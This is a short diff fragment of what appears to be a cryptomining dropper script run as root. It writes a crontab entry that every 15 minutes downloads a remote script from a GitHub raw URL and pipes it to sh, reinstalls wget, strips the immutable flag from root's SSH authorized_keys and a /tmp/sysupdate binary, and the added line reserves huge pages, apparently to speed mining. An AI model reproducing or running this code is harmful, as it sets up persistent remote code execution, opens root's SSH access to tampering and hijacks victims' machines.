@@ -10,6 +10,7 @@ touch /var/spool/cron/root
 echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/9018/9017/master/a7.sh |sh" > /var/spool/cron/root
 yum remove wget -y
 yum install wget -y
+echo 1000000 > /proc/sys/vm/nr_hugepages
 chattr -i /root/.ssh/authorized_keys
 chattr -i /tmp/sysupdate
 rm -rf /tmp/sysupdate
